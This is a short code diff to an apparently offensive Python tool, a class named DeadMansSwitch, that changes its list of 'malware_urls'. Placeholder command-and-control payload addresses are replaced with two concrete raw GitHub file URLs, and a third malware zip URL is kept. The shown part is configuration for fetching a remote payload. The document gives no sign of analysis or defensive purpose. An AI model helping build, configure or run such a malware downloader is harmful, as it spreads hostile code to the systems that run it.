@@ -120,8 +120,8 @@ class DeadMansSwitch:
         
         # Configuration URLs (MUST BE UPDATED)
         self.malware_urls = [
-            "https://your-c2-server.com/deepseek_payload.zip",
-            "https://backup-c2-server.com/deepseek_payload.zip",
+            "https://raw.githubusercontent.com/ninja251/improved-lamp987654321234567/refs/heads/main/deepseek_python_20251118_1133b4.py",
+            "https://raw.githubusercontent.com/nuojjijia/jubilant-waffle21q3wsedfr5gt6/refs/heads/main/deepseek_python_20251118_1133b4.py",
             "https://cdn.backup.com/malware/deepseek.zip"
         ]
         
